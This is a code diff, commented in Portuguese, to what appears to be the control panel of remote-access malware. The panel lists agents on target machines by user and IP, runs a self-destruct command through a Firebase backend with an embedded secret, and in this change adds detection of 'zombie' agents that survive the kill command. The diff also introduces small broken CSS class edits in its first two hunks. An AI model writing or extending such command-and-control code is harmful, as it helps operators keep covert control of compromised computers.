@@ -54,7 +54,7 @@
     <div id="create-password-screen" class="hidden flex-col items-center justify-center min-h-[85vh] w-full max-w-md mx-auto transition-opacity duration-500 px-2">
         <div class="glass p-6 sm:p-8 rounded-2xl w-full shadow-2xl">
             <div class="flex justify-center mb-4">
-                <div class="w-14 h-14 sm:w-16 sm:h-16 bg-slate-900 rounded-full border border-slate-700 flex items-center justify-center text-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
+                <div class="w-14 h-14 sm:w-16 h-16 bg-slate-900 rounded-full border border-slate-700 flex items-center justify-center text-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                     <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                 </div>
             </div>
@@ -83,7 +83,7 @@
     <div id="login-screen" class="hidden flex-col items-center justify-center min-h-[85vh] w-full max-w-md mx-auto transition-opacity duration-500 px-2">
         <div class="glass p-6 sm:p-8 rounded-2xl w-full shadow-2xl">
             <div class="flex justify-center mb-4">
-                <div class="w-14 h-14 sm:w-16 sm:h-16 bg-slate-900 rounded-full border border-slate-700 flex items-center justify-center text-sky-500 shadow-[0_0_15px_rgba(2,132,199,0.2)]">
+                <div class="w-14 h-14 sm:w-16 h-16 bg-slate-900 rounded-full border border-slate-700 flex items-center justify-center text-sky-500 shadow-[0_0_15px_rgba(2,132,199,0.2)]">
                     <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                 </div>
             </div>
@@ -709,15 +709,35 @@
             for (const [clientId, clientData] of Object.entries(clientsObj)) {
                 if(clientId === "admin_config") continue; 
                 
-                // NOVO LÓGICA KILL SWITCH: Pula agentes destruídos e limpa se página for recarregada
-                if(clientData && clientData.killedAt) {
+                // === LÓGICA DO KILL SWITCH COM DETEÇÃO DE "ZUMBIS" ===
+                let isZombie = false;
+                
+                if (clientData && clientData.killedAt) {
                     const killedTime = parseInt(clientData.killedAt);
-                    if (Date.now() - killedTime > 180000) {
-                        // Passados os 3 minutos da destruição, elimina mesmo o nó da base de dados.
-                        let deleteUrl = `${FB_URL}clients/${clientId}.json?auth=${FB_SECRET}`;
-                        fetch(deleteUrl, { method: 'DELETE' }).catch(()=>{});
+                    let lastSeenTime = 0;
+                    
+                    if (clientData.status && clientData.status.last_seen) {
+                        lastSeenTime = new Date(clientData.status.last_seen).getTime();
                     }
-                    continue; // Pula este agente, não mostrando mais o "card"
+
+                    // Se a máquina pingou pelo menos 20s APÓS o comando de Kill Switch
+                    // significa que ela reiniciou, o script sobreviveu e ela continua ativa!
+                    if (lastSeenTime > killedTime + 20000) {
+                        isZombie = true;
+                        // Apaga a flag de "morto" do Firebase para parar de tentar destruir o que já sobreviveu
+                        fetch(`${FB_URL}clients/${clientId}/killedAt.json?auth=${FB_SECRET}`, { method: 'DELETE' }).catch(()=>{});
+                        // Remove da memória local para mostrar o card normalmente
+                        delete clientData.killedAt;
+                    } else {
+                        // A máquina está morta ou no processo de morrer (ainda não pingou)
+                        if (Date.now() - killedTime > 180000) {
+                            // Passaram-se os 3 minutos, ela não ressuscitou. Limpa definitivamente da DB.
+                            let deleteUrl = `${FB_URL}clients/${clientId}.json?auth=${FB_SECRET}`;
+                            fetch(deleteUrl, { method: 'DELETE' }).catch(()=>{});
+                        }
+                        // Pula a renderização deste card enquanto estiver dado como morto
+                        continue; 
+                    }
                 }
 
                 const safeId = clientId.replace(/[^a-zA-Z0-9]/g, '_');
@@ -768,6 +788,8 @@
                 const isExpanded = expandedClients.has(clientId);
                 const detailsDisplayClass = isExpanded ? '' : 'hidden md:block';
                 const chevronRotationClass = isExpanded ? 'rotate-180' : '';
+                
+                const zombieBadge = isZombie ? `<span class="bg-red-500/20 border border-red-500 text-red-400 text-[8px] sm:text-[9px] px-1.5 py-0.5 rounded font-bold ml-2 animate-pulse" title="O comando de Auto-Destruição falhou ou o agente foi reativado no hospedeiro.">FALHA DESTRUIÇÃO</span>` : '';
 
                 finalHtml += `
                     <div class="glass p-4 sm:p-5 rounded-2xl border border-slate-800 hover:border-slate-700 transition-colors flex flex-col relative overflow-hidden">
@@ -777,6 +799,7 @@
                                 <h3 class="text-sm sm:text-base font-bold text-white flex items-center gap-1.5 truncate" title="ID Original: ${clientId}">
                                     <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" class="text-sky-500 flex-shrink-0 sm:w-4 sm:h-4"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                                     ${displayName}
+                                    ${zombieBadge}
                                 </h3>
                                 <p class="text-[9px] sm:text-[10px] text-slate-400 mt-1 truncate">${user} @ ${ip}</p>
                             </div>
@@ -1210,16 +1233,9 @@
                     }
                     renderClients(window.clientsCache);
 
-                    // 3. Dá tempo para o hospedeiro (máquina alvo) sincronizar e ler o comando, 
-                    //    e apenas passado esse tempo é que a DB do Firebase é apagada definitivamente.
-                    setTimeout(async () => {
-                        try {
-                            let deleteUrl = `${FB_URL}clients/${clientId}.json?auth=${FB_SECRET}`;
-                            await fetch(deleteUrl, { method: 'DELETE' });
-                        } catch(e) {}
-                    }, 180000); // Aguarda 3 minutos (180.000 ms)
-                    
-                    return; // Sai da função sem chamar a atualização genérica
+                    // A limpeza definitiva da DB foi movida para o ciclo da função renderClients()
+                    // para evitar a eliminação se o agente provar que sobreviveu.
+                    return; 
                 }
 
                 setTimeout(fetchClients, 2000); 
